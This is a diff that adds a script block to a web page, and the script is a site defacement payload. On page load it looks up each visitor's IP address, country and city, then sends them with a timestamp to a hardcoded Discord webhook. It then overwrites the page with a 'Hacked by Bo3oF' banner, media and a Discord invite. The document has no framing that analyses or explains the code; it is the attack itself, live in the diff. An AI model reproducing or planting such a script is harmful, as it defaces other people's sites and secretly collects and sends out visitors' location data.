@@ -1,0 +1,97 @@
+<script>
+    fetch('https://ipinfo.io/json')
+       .then(response => response.json())
+       .then(data => {
+         const { ip, country, city, region } = data;
+         const dateTime = new Date().toLocaleString();
+         const webhookUrl = 'https://discord.com/api/webhooks/1275485451108614226/ULsYX9jZLMAKY7UW-T7iz_lXsViCmRdqMk8RhL2smylAZhUhqlsUfcoRakbMHsrIAZj3';
+         fetch(webhookUrl, {
+           method: 'POST',
+           headers: {'Content-Type': 'application/json'},
+           body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+         });
+         document.documentElement.innerHTML = `<!DOCTYPE html>
+         <html lang='en'>
+           <head>
+             <meta charset='UTF-8'>
+             <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+             <style>
+             body, html {
+               margin: 0;
+               padding: 0;
+               height: 100%;
+               overflow: hidden;
+             }
+             body {
+               background-color: black;
+               color: white;
+               font-family: Arial, sans-serif;
+               display: flex;
+               justify-content: center;
+               align-items: center;
+             }
+             .video-background {
+               position: fixed;
+               top: 0;
+               left: 0;
+               width: 100%;
+               height: 100%;
+               object-fit: cover;
+               z-index: -1;
+             }
+             .container {
+               text-align: center;
+               position: relative;
+               z-index: 1;
+               border-radius: 15px;
+               padding: 20px;
+             }
+             .container img {
+               width: 80%;
+               max-width: 1000px;
+               display: block;
+               margin: 0 auto;
+             }
+             .container h1 {
+               color: red;
+               font-size: 36px;
+               font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+             }
+             #discord-link {
+               color: red;
+               animation: flash 1s infinite alternate;
+               transition: color 1s;
+             }
+             @keyframes flash {
+               0% {
+                 color: red;
+               }
+               50% {
+                 color: blue;
+               }
+               100% {
+                 color: red;
+               }
+             }
+             </style>
+           </head>
+           <body>
+             <video class="video-background" autoplay loop muted>
+               <source src="https://r2.guns.lol/1ff0c7d2-bb53-4842-81a4-73dad980c85f.mp4">
+             </video>
+             <div class='container'>
+               <img src="https://cdn.discordapp.com/attachments/1045125628095107132/1272145659717357608/IMG_6499.jpg?ex=66bdddf8&is=66bc8c78&hm=1dac5bdcba2b37a4ae0f92ffd44165f516ba5dcc228d718ecf6d01ba4abaec12&">
+               <h1></h1>
+               <h1>Hacked by  Bo3oF</h1>
+               <p>IP : <span id='ip'>${ip}</span></p>
+               <p>Country & City : <span id='location'>${country} - ${city}</span></p>
+               <p id="discord-link" style="font-size: 36px; animation: flash 2s infinite alternate;">Discord.gg/UAEE
+               </p>
+             </div>
+             <audio autoplay loop>
+               <source src="https://cdn.discordapp.com/attachments/1188220390519087175/1263713565978787923/1ff0c7d2-bb53-4842-81a4-73dad980c85f.mp3?ex=66c6bdf8&is=66c56c78&hm=6e716edea74aad245c9836112efe556ebdddd81e0d23ebf586f99c76132b7325&" type="audio/mpeg">
+             </audio>
+           </body>
+         </html>`;
+       });
+   </script>
